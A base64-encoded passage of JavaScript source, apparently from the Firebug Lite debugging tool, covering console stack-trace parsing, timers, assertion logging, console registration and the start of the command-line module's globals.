gICAgICB2YXIgZnJhbWVQb3MgPSAwOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGk9NCwgbGVuZ3RoPWl0ZW1zLmxlbmd0aDsgaTxsZW5ndGg7IGkrKywgZnJhbWVQb3MrKykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBmcmFtZSA9IGZyYW1lc1tmcmFtZVBvc107DQogICAgICAgICAgICAgICAgICAgIHZhciBpdGVtID0gaXRlbXNbaV07DQogICAgICAgICAgICAgICAgICAgIHZhciBtYXRjaCA9IGl0ZW0ubWF0Y2gocmVDaHJvbWVTdGFja0l0ZW0pOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKCJbIisgZnJhbWVQb3MgKyJdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTsNCiAgICAgICAgICAgICAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKGl0ZW0pOw0KICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coIi4uLi4uLi4uLi4uLi4uLi4iKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChtYXRjaCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG5hbWUgPSBtYXRjaFsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChuYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSBuYW1lLnJlcGxhY2UocmVDaHJvbWVTdGFja0l0ZW1OYW1lLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnJhbWUubmFtZSA9IG5hbWU7IA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coIm5hbWU6ICIrbmFtZSk7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB2YWx1ZSA9IG1hdGNoWzJdLm1hdGNoKHJlQ2hyb21lU3RhY2tJdGVtVmFsdWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHZhbHVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyYW1lLmhyZWYgPSB2YWx1ZVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcmFtZS5saW5lTm8gPSB2YWx1ZVsyXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coInVybDogIit2YWx1ZVsxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKCJsaW5lOiAiK3ZhbHVlWzJdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIC8vZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgRmlyZWJ1Zy5Db25zb2xlLmxvZyhtYXRjaFsyXSk7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgfSAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAvKiovDQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgICAgICBlbHNlIGlmIChGQkwuaXNGaXJlZm94KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIEZpcmVmb3gNCiAgICAgICAgICAgICAgICB2YXIgcmVGaXJlZm94U3RhY2tJdGVtID0gL14oLiopQCguKikkLzsNCiAgICAgICAgICAgICAgICB2YXIgcmVGaXJlZm94U3RhY2tJdGVtVmFsdWUgPSAvXiguKylcOihcZCspJC87DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIGZyYW1lUG9zID0gMDsNCiAgICAgICAgICAgICAgICBmb3IgKHZhciBpPTIsIGxlbmd0aD1pdGVtcy5sZW5ndGg7IGk8bGVuZ3RoOyBpKyssIGZyYW1lUG9zKyspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgZnJhbWUgPSBmcmFtZXNbZnJhbWVQb3NdIHx8IHt9Ow0KICAgICAgICAgICAgICAgICAgICB2YXIgaXRlbSA9IGl0ZW1zW2ldOw0KICAgICAgICAgICAgICAgICAgICB2YXIgbWF0Y2ggPSBpdGVtLm1hdGNoKHJlRmlyZWZveFN0YWNrSXRlbSk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAobWF0Y2gpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBuYW1lID0gbWF0Y2hbMV07DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmxvZ0Zvcm1hdHRlZCgibmFtZTogIituYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gbWF0Y2hbMl0ubWF0Y2gocmVGaXJlZm94U3RhY2tJdGVtVmFsdWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHZhbHVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyYW1lLmhyZWYgPSB2YWx1ZVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcmFtZS5saW5lTm8gPSB2YWx1ZVsyXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coImhyZWY6ICIrIHZhbHVlWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coImxpbmU6ICIgKyB2YWx1ZVsyXSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAvL2Vsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vICAgIEZpcmVidWcuQ29uc29sZS5sb2dGb3JtYXR0ZWQoW21hdGNoWzJdXSk7DQogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgLyoqLw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAgICAgLyoNCiAgICAgICAgICAgIGVsc2UgaWYgKEZCTC5pc09wZXJhKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIE9wZXJhDQogICAgICAgICAgICAgICAgdmFyIHJlT3BlcmFTdGFja0l0ZW0gPSAvXlxzXHMoPzpcLlwuXC5cc1xzKT9MaW5lXHMoXGQrKVxzb2ZccyguKykkLzsNCiAgICAgICAgICAgICAgICB2YXIgcmVPcGVyYVN0YWNrSXRlbVZhbHVlID0gL15saW5rZWRcc3NjcmlwdFxzKC4rKSQvOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAodmFyIGk9MCwgbGVuZ3RoPWl0ZW1zLmxlbmd0aDsgaTxsZW5ndGg7IGkrPTIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgaXRlbSA9IGl0ZW1zW2ldOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdmFyIG1hdGNoID0gaXRlbS5tYXRjaChyZU9wZXJhU3RhY2tJdGVtKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChtYXRjaCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKG1hdGNoWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gbWF0Y2hbMl0ubWF0Y2gocmVPcGVyYVN0YWNrSXRlbVZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHZhbHVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmxvZyh2YWx1ZVsxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAvL2Vsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vICAgIEZpcmVidWcuQ29uc29sZS5sb2cobWF0Y2hbMl0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7DQogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgLyoqLw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGUubG9nKHN0YWNrKTsNCiAgICAgICAgLy9jb25zb2xlLmRpcihmcmFtZXMpOw0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKHtmcmFtZXM6IGZyYW1lc30sIGNvbnRleHQsICJzdGFja1RyYWNlIiwgRmlyZWJ1Z1JlcHMuU3RhY2tUcmFjZSk7DQogICAgICAgIA0KICAgICAgICB0cmFjZVJlY3Vyc2lvbi0tOw0KICAgIH07DQogICAgDQogICAgdGhpcy50cmFjZV9vayA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBnZXRGdW5jTmFtZSA9IGZ1bmN0aW9uIGdldEZ1bmNOYW1lIChmKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoZi5nZXROYW1lIGluc3RhbmNlb2YgRnVuY3Rpb24pDQogICAgICAgICAgICAgICAgcmV0dXJuIGYuZ2V0TmFtZSgpOw0KICAgICAgICAgICAgaWYgKGYubmFtZSkgLy8gaW4gRmlyZUZveCwgRnVuY3Rpb24gb2JqZWN0cyBoYXZlIGEgbmFtZSBwcm9wZXJ0eS4uLg0KICAgICAgICAgICAgICAgIHJldHVybiBmLm5hbWU7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBuYW1lID0gZi50b1N0cmluZygpLm1hdGNoKC9mdW5jdGlvblxzKihbXyRcd1xkXSopLylbMV07DQogICAgICAgICAgICByZXR1cm4gbmFtZSB8fCAiYW5vbnltb3VzIjsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHZhciB3YXNWaXNpdGVkID0gZnVuY3Rpb24oZm4pDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIGk9MCwgbD1mcmFtZXMubGVuZ3RoOyBpPGw7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoZnJhbWVzW2ldLmZuID09IGZuKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9Ow0KICAgIA0KICAgICAgICB2YXIgZnJhbWVzID0gW107DQogICAgICAgIA0KICAgICAgICBmb3IgKHZhciBmbiA9IGFyZ3VtZW50cy5jYWxsZWUuY2FsbGVyOyBmbjsgZm4gPSBmbi5jYWxsZXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh3YXNWaXNpdGVkKGZuKSkgYnJlYWs7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBhcmdzID0gW107DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBsID0gZm4uYXJndW1lbnRzLmxlbmd0aDsgaSA8IGw7ICsraSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhcmdzLnB1c2goe3ZhbHVlOiBmbi5hcmd1bWVudHNbaV19KTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZnJhbWVzLnB1c2goe2ZuOiBmbiwgbmFtZTogZ2V0RnVuY05hbWUoZm4pLCBhcmdzOiBhcmdzfSk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2coe2ZyYW1lczogZnJhbWVzfSwgY29udGV4dCwgInN0YWNrVHJhY2UiLCBGaXJlYnVnUmVwcy5TdGFja1RyYWNlKTsNCiAgICB9Ow0KICAgIA0KICAgIHRoaXMuY2xlYXIgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUuY2xlYXIoY29udGV4dCk7DQogICAgfTsNCg0KICAgIHRoaXMudGltZSA9IGZ1bmN0aW9uKG5hbWUsIHJlc2V0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFuYW1lKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHZhciB0aW1lID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQoNCiAgICAgICAgaWYgKCF0aGlzLnRpbWVDb3VudGVycykNCiAgICAgICAgICAgIHRoaXMudGltZUNvdW50ZXJzID0ge307DQoNCiAgICAgICAgdmFyIGtleSA9ICJLRVkiK25hbWUudG9TdHJpbmcoKTsNCg0KICAgICAgICBpZiAoIXJlc2V0ICYmIHRoaXMudGltZUNvdW50ZXJzW2tleV0pDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdGhpcy50aW1lQ291bnRlcnNba2V5XSA9IHRpbWU7DQogICAgfTsNCg0KICAgIHRoaXMudGltZUVuZCA9IGZ1bmN0aW9uKG5hbWUpDQogICAgew0KICAgICAgICB2YXIgdGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpOw0KDQogICAgICAgIGlmICghdGhpcy50aW1lQ291bnRlcnMpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdmFyIGtleSA9ICJLRVkiK25hbWUudG9TdHJpbmcoKTsNCg0KICAgICAgICB2YXIgdGltZUNvdW50ZXIgPSB0aGlzLnRpbWVDb3VudGVyc1trZXldOw0KICAgICAgICBpZiAodGltZUNvdW50ZXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBkaWZmID0gdGltZSAtIHRpbWVDb3VudGVyOw0KICAgICAgICAgICAgdmFyIGxhYmVsID0gbmFtZSArICI6ICIgKyBkaWZmICsgIm1zIjsNCg0KICAgICAgICAgICAgdGhpcy5pbmZvKGxhYmVsKTsNCg0KICAgICAgICAgICAgZGVsZXRlIHRoaXMudGltZUNvdW50ZXJzW2tleV07DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGRpZmY7DQogICAgfTsNCg0KICAgIC8vIFRoZXNlIGZ1bmN0aW9ucyBhcmUgb3Zlci1yaWRkZW4gYnkgY29tbWFuZExpbmUNCiAgICB0aGlzLmV2YWx1YXRlZCA9IGZ1bmN0aW9uKHJlc3VsdCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNvbnNvbGVJbmplY3Rvci5GaXJlYnVnQ29uc29sZUhhbmRsZXIgZXZhbHV0YXRlZCBkZWZhdWx0IGNhbGxlZCIsIHJlc3VsdCk7DQoNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmxvZyhyZXN1bHQsIGNvbnRleHQpOw0KICAgIH07DQogICAgdGhpcy5ldmFsdWF0ZUVycm9yID0gZnVuY3Rpb24ocmVzdWx0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmxvZyhyZXN1bHQsIGNvbnRleHQsICJlcnJvck1lc3NhZ2UiKTsNCiAgICB9Ow0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgZnVuY3Rpb24gbG9nRm9ybWF0dGVkKGFyZ3MsIGNsYXNzTmFtZSwgbGlua1RvU291cmNlLCBub1Rocm90dGxlKQ0KICAgIHsNCiAgICAgICAgdmFyIHNvdXJjZUxpbmsgPSBsaW5rVG9Tb3VyY2UgPyBnZXRTdGFja0xpbmsoKSA6IG51bGw7DQogICAgICAgIHJldHVybiBGaXJlYnVnLkNvbnNvbGUubG9nRm9ybWF0dGVkKGFyZ3MsIGNvbnRleHQsIGNsYXNzTmFtZSwgbm9UaHJvdHRsZSwgc291cmNlTGluayk7DQogICAgfQ0KDQogICAgZnVuY3Rpb24gbG9nQXNzZXJ0KGNhdGVnb3J5LCBhcmdzKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5FcnJvcnMuaW5jcmVhc2VDb3VudChjb250ZXh0KTsNCg0KICAgICAgICBpZiAoIWFyZ3MgfHwgIWFyZ3MubGVuZ3RoIHx8IGFyZ3MubGVuZ3RoID09IDApDQogICAgICAgICAgICB2YXIgbXNnID0gW0ZCTC4kU1RSKCJBc3NlcnRpb24iKV07DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHZhciBtc2cgPSBhcmdzWzBdOw0KDQogICAgICAgIGlmIChGaXJlYnVnLmVycm9yU3RhY2tUcmFjZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHRyYWNlID0gRmlyZWJ1Zy5lcnJvclN0YWNrVHJhY2U7DQogICAgICAgICAgICBkZWxldGUgRmlyZWJ1Zy5lcnJvclN0YWNrVHJhY2U7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibG9nQXNzZXJ0IHRyYWNlIGZyb20gZXJyb3JTdGFja1RyYWNlIiwgdHJhY2UpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKG1zZy5zdGFjaykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHRyYWNlID0gcGFyc2VUb1N0YWNrVHJhY2UobXNnLnN0YWNrKTsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJsb2dBc3NlcnQgdHJhY2UgZnJvbSBtc2cuc3RhY2siLCB0cmFjZSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdHJhY2UgPSBnZXRKU0RVc2VyU3RhY2soKTsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJsb2dBc3NlcnQgdHJhY2UgZnJvbSBnZXRKU0RVc2VyU3RhY2siLCB0cmFjZSk7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgZXJyb3JPYmplY3QgPSBuZXcgRkJMLkVycm9yTWVzc2FnZShtc2csIChtc2cuZmlsZU5hbWU/bXNnLmZpbGVOYW1lOndpbi5sb2NhdGlvbiksIChtc2cubGluZU51bWJlcj9tc2cubGluZU51bWJlcjowKSwgIiIsIGNhdGVnb3J5LCBjb250ZXh0LCB0cmFjZSk7DQoNCg0KICAgICAgICBpZiAodHJhY2UgJiYgdHJhY2UuZnJhbWVzICYmIHRyYWNlLmZyYW1lc1swXSkNCiAgICAgICAgICAgZXJyb3JPYmplY3QuY29ycmVjdFdpdGhTdGFja1RyYWNlKHRyYWNlKTsNCg0KICAgICAgICBlcnJvck9iamVjdC5yZXNldFNvdXJjZSgpOw0KDQogICAgICAgIHZhciBvYmplY3RzID0gZXJyb3JPYmplY3Q7DQogICAgICAgIGlmIChhcmdzLmxlbmd0aCA+IDEpDQogICAgICAgIHsNCiAgICAgICAgICAgIG9iamVjdHMgPSBbZXJyb3JPYmplY3RdOw0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDE7IGkgPCBhcmdzLmxlbmd0aDsgaSsrKQ0KICAgICAgICAgICAgICAgIG9iamVjdHMucHVzaChhcmdzW2ldKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHZhciByb3cgPSBGaXJlYnVnLkNvbnNvbGUubG9nKG9iamVjdHMsIGNvbnRleHQsICJlcnJvck1lc3NhZ2UiLCBudWxsLCB0cnVlKTsgLy8gbm9UaHJvdHRsZQ0KICAgICAgICByb3cuc2Nyb2xsSW50b1ZpZXcoKTsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBnZXRDb21wb25lbnRzU3RhY2tEdW1wKCkNCiAgICB7DQogICAgICAgIC8vIFN0YXJ0aW5nIHdpdGggb3VyIHN0YWNrLCB3YWxrIGJhY2sgdG8gdGhlIHVzZXItbGV2ZWwgY29kZQ0KICAgICAgICB2YXIgZnJhbWUgPSBDb21wb25lbnRzLnN0YWNrOw0KICAgICAgICB2YXIgdXNlclVSTCA9IHdpbi5sb2NhdGlvbi5ocmVmLnRvU3RyaW5nKCk7DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZUluamVjdG9yLmdldENvbXBvbmVudHNTdGFja0R1bXAgaW5pdGlhbCBzdGFjayBmb3IgdXNlclVSTCAiK3VzZXJVUkwsIGZyYW1lKTsNCg0KICAgICAgICAvLyBEcm9wIGZyYW1lcyB1bnRpbCB3ZSBnZXQgaW50byB1c2VyIGNvZGUuDQogICAgICAgIHdoaWxlIChmcmFtZSAmJiBGQkwuaXNTeXN0ZW1VUkwoZnJhbWUuZmlsZW5hbWUpICkNCiAgICAgICAgICAgIGZyYW1lID0gZnJhbWUuY2FsbGVyOw0KDQogICAgICAgIC8vIERyb3AgdHdvIG1vcmUgZnJhbWVzLCB0aGUgaW5qZWN0ZWQgY29uc29sZSBmdW5jdGlvbiBhbmQgZmlyZWJ1Z0FwcGVuZENvbnNvbGUoKQ0KICAgICAgICBpZiAoZnJhbWUpDQogICAgICAgICAgICBmcmFtZSA9IGZyYW1lLmNhbGxlcjsNCiAgICAgICAgaWYgKGZyYW1lKQ0KICAgICAgICAgICAgZnJhbWUgPSBmcmFtZS5jYWxsZXI7DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZUluamVjdG9yLmdldENvbXBvbmVudHNTdGFja0R1bXAgZmluYWwgc3RhY2sgZm9yIHVzZXJVUkwgIit1c2VyVVJMLCBmcmFtZSk7DQoNCiAgICAgICAgcmV0dXJuIGZyYW1lOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIGdldFN0YWNrTGluaygpDQogICAgew0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBjb25zb2xlMg0KICAgICAgICByZXR1cm47DQogICAgICAgIC8vcmV0dXJuIEZCTC5nZXRGcmFtZVNvdXJjZUxpbmsoZ2V0Q29tcG9uZW50c1N0YWNrRHVtcCgpKTsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBnZXRKU0RVc2VyU3RhY2soKQ0KICAgIHsNCiAgICAgICAgdmFyIHRyYWNlID0gRkJMLmdldEN1cnJlbnRTdGFja1RyYWNlKGNvbnRleHQpOw0KDQogICAgICAgIHZhciBmcmFtZXMgPSB0cmFjZSA/IHRyYWNlLmZyYW1lcyA6IG51bGw7DQogICAgICAgIGlmIChmcmFtZXMgJiYgKGZyYW1lcy5sZW5ndGggPiAwKSApDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBvbGRlc3QgPSBmcmFtZXMubGVuZ3RoIC0gMTsgIC8vIDYgLSAxID0gNQ0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBmcmFtZXMubGVuZ3RoOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGZyYW1lc1tvbGRlc3QgLSBpXS5ocmVmLmluZGV4T2YoImNocm9tZToiKSA9PSAwKSBicmVhazsNCiAgICAgICAgICAgICAgICB2YXIgZm4gPSBmcmFtZXNbb2xkZXN0IC0gaV0uZm4gKyAiIjsNCiAgICAgICAgICAgICAgICBpZiAoZm4gJiYgKGZuLmluZGV4T2YoIl9maXJlYnVnRXZhbEV2ZW50IikgIT0gLTEpICkgYnJlYWs7ICAvLyBjb21tYW5kIGxpbmUNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlSW5qZWN0b3IgZ2V0SlNEVXNlclN0YWNrOiAiK2ZyYW1lcy5sZW5ndGgrIiBvbGRlc3Q6ICIrb2xkZXN0KyIgaTogIitpKyIgaSAtIG9sZGVzdCArIDI6ICIrKGkgLSBvbGRlc3QgKyAyKSwgdHJhY2UpOw0KICAgICAgICAgICAgdHJhY2UuZnJhbWVzID0gdHJhY2UuZnJhbWVzLnNsaWNlKDIgLSBpKTsgIC8vIHRha2UgdGhlIG9sZGVzdCBmcmFtZXMsIGxlYXZlIDIgYmVoaW5kIHRoZXkgYXJlIGluamVjdGlvbiBjb2RlDQoNCiAgICAgICAgICAgIHJldHVybiB0cmFjZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gIkZpcmVidWcgZmFpbGVkIHRvIGdldCBzdGFjayB0cmFjZSB3aXRoIGFueSBmcmFtZXMiOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gUmVnaXN0ZXIgY29uc29sZSBuYW1lc3BhY2UNCg0KRkJMLnJlZ2lzdGVyQ29uc29sZSA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgd2luID0gRW52LmJyb3dzZXIud2luZG93Ow0KICAgIEZpcmVidWcuQ29uc29sZS5pbmplY3Rvci5pbnN0YWxsKHdpbik7DQp9Ow0KDQpyZWdpc3RlckNvbnNvbGUoKTsNCg0KfX0pOw0KDQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gR2xvYmFscw0KDQp2YXIgY29tbWFuZFByZWZpeCA9ICI+Pj4iOw0KdmFyIHJlT3BlbkJyYWNrZXQgPSAvW1xbXChce10vOw0KdmFyIHJlQ2xvc2VCcmFja2V0ID0gL1tcXVwpXH1dLzsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIGNvbW1hbmRIaXN0b3J5ID0gW107DQp2YXIgY29tbWFuZFBvaW50ZXIgPSAtMTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIGlzQXV0b0NvbXBsZXRpbmcgPSBudWxsOw0KdmFyIGF1dG9Db21wbGV0ZVByZWZpeCA9IG51bGw7DQp2YXIgYXV0b0NvbXBsZXRlRXhwciA9IG51bGw7DQp2YXIgYXV0b0NvbXBsZXRlQnVmZmVyID0gbnVsbDsNCnZhciBhdXRvQ29tcGxldGVQb3NpdGlvbiA9IG51bGw7DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZhciBmYkNvbW1hbmRMaW5lID0gbnVsbDsNCnZhciBmYkxhcmdlQ29tbWFuZExpbmUgPSBudWxsOw0KdmFyIGZiTGFyZ2VDb21tYW5kQnV0dG9ucyA9IG51bGw7DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICog